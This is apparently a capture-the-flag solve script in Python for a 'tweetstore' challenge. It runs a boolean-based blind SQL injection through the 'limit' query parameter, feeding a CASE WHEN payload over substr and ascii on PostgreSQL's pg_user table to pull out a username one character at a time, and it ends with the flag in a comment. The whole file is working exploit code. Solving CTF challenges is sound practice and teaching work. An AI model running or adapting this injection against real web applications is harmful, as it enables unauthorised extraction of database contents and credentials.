import requests


def judge(html):
    return "1 of 200 tweets are displayed. enjoy" in html


url = "http://tweetstore.quals.beginners.seccon.jp"


def leak_usename():
    leak = ""
    for j in range(27, 1000):
        for i in range(126, 32, -1):
            buf = f"(CASE WHEN (SELECT ascii(substr(usename, {j}, 1)) FROM pg_user LIMIT 1 OFFSET 1) = {i} THEN 1 ELSE 0 END)"
            params = {"search": "a", "limit": buf}
            print(buf)
            res = requests.get(url, params=params)
            if judge(res.text):
                leak += chr(i)
                print(f"[+] now:{leak}")
                break
        if len(leak) != j:
            print(f"[*] {leak}")
            break

leak_usename()
# ctf4b{is_postgres_your_friend?}
